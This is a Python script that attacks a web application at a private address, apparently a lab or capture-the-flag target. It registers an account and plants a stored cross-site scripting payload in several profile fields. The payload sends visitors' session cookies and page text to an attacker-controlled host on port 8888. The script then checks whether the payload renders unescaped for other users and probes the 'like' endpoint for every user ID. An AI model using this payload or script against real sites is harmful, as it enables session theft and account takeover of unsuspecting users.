import requests, re

BASE = "http://10.112.165.127:5000"
COOKIE = "eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiMTIzIn0.aeFLFA.efdhJ78NfiztsKIzas2UVa5PXzw"

s = requests.Session()
s.cookies.set("session", COOKIE)

# 1) Debug like with no redirect follow
print("=== POST /like/8 (no redirect) ===")
r = s.post(f"{BASE}/like/8", allow_redirects=False, timeout=10)
print(f"Status: {r.status_code}")
print(f"Location: {r.headers.get('Location', 'none')}")
print(f"Set-Cookie: {r.headers.get('Set-Cookie', 'none')[:200]}")
print(f"Body: {r.text[:200]}")

# Follow if redirect
if r.status_code in (301, 302, 303):
    loc = r.headers.get("Location", "")
    print(f"\nFollowing redirect to: {loc}")
    r2 = s.get(f"{BASE}{loc}" if not loc.startswith("http") else loc, timeout=10)
    print(f"Status: {r2.status_code}, Length: {len(r2.text)}")
    text = re.sub(r"<[^>]+>", " ", r2.text)
    text = re.sub(r"\s+", " ", text).strip()
    print(f"Text: {text[:300]}")

# 2) Register fresh account and try
import random, string
uname = "xss_" + "".join(random.choices(string.ascii_lowercase, k=5))
pwd = "Test1234!"
print(f"\n=== Registering fresh account: {uname} ===")
s2 = requests.Session()
r = s2.post(f"{BASE}/register", data={"username": uname, "password": pwd}, allow_redirects=False, timeout=10)
print(f"Register: {r.status_code}, Location: {r.headers.get('Location', 'none')}")
print(f"Cookie: {s2.cookies.get('session', 'none')[:100]}")

# Login
r = s2.post(f"{BASE}/login", data={"username": uname, "password": pwd}, allow_redirects=False, timeout=10)
print(f"Login: {r.status_code}, Location: {r.headers.get('Location', 'none')}")
new_cookie = s2.cookies.get("session", "")
print(f"New cookie: {new_cookie[:100]}")

# Complete profile with XSS
print("\n=== Seeding XSS with fresh account ===")
ATTACKER = "10.112.69.178"
PORT = 8888
js = (
    "var c=document.cookie||'nocookie';"
    "var t=(document.body?document.body.innerText:'').substring(0,500);"
    f"new Image().src='http://{ATTACKER}:{PORT}/x?d='+encodeURIComponent(c)+'&t='+encodeURIComponent(t)"
)
xss = f'<img src=x onerror="{js}">'

r = s2.post(f"{BASE}/complete_profile", data={
    "real_name": xss,
    "email": "x@x.com",
    "phone": "111",
    "address": xss,
    "bio": xss,
}, allow_redirects=False, timeout=10)
print(f"Complete profile: {r.status_code}, Location: {r.headers.get('Location', 'none')}")

# Check our profile from our own session - does the XSS render raw?
r = s2.get(f"{BASE}/my_profile", timeout=10)
has_raw = "onerror" in r.text and "<img" in r.text
has_escaped = "&lt;img" in r.text or "&lt;svg" in r.text
print(f"my_profile: raw_xss={has_raw}, escaped_xss={has_escaped}")

# Check how our profile appears to others
r = s2.get(f"{BASE}/profile/{uname}", timeout=10)
has_raw2 = "onerror" in r.text and "<img" in r.text
has_escaped2 = "&lt;img" in r.text
print(f"profile/{uname}: raw_xss={has_raw2}, escaped_xss={has_escaped2}, len={len(r.text)}")
if has_raw2:
    # Find the XSS portion
    idx = r.text.find("onerror")
    print(f"  XSS snippet: ...{r.text[max(0,idx-30):idx+100]}...")

# Check profile from old session perspective
r = s.get(f"{BASE}/profile/{uname}", timeout=10)
has_raw3 = "onerror" in r.text and "<img" in r.text
print(f"profile/{uname} (other session): raw_xss={has_raw3}, len={len(r.text)}")

# 3) Try POST /like/8 with fresh session
print("\n=== Like with fresh session ===")
r = s2.post(f"{BASE}/like/8", allow_redirects=False, timeout=10)
print(f"POST /like/8: {r.status_code}, Location: {r.headers.get('Location', 'none')}")
print(f"Set-Cookie: {r.headers.get('Set-Cookie', 'none')[:200]}")
print(f"Body: {r.text[:200]}")

# Try all users
for uid in [1, 2, 3, 4, 5, 6, 7, 8]:
    r = s2.post(f"{BASE}/like/{uid}", allow_redirects=False, timeout=10)
    print(f"POST /like/{uid}: {r.status_code}, Loc: {r.headers.get('Location', 'none')}")

# 4) Check dashboard with fresh session to see what forms exist
r = s2.get(f"{BASE}/dashboard", timeout=10)
actions = re.findall(r'action="([^"]+)"', r.text)
print(f"\nFresh dashboard actions: {actions}")

# Show updated cookie
print(f"\nFinal cookie: {s2.cookies.get('session', 'none')[:100]}")
